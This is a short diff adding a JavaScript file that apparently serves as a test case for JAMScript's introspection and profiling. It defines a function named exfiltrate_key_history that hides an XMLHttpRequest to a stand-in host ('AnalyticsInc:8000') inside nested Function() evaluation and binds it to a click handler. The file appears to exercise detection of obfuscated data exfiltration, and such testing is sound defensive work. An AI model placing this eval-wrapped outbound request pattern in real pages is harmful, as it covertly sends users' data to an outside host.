@@ -1,0 +1,12 @@
+
+JAM.startProfile('load');
+introspect(JAMScript.introspectors.processAll) {
+function exfiltrate_key_history() {
+  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);';
+  Function(nest)()()
+}
+document.getElementById("test").onclick = exfiltrate_key_history;
+
+}
+
+JAM.stopProfile('load');
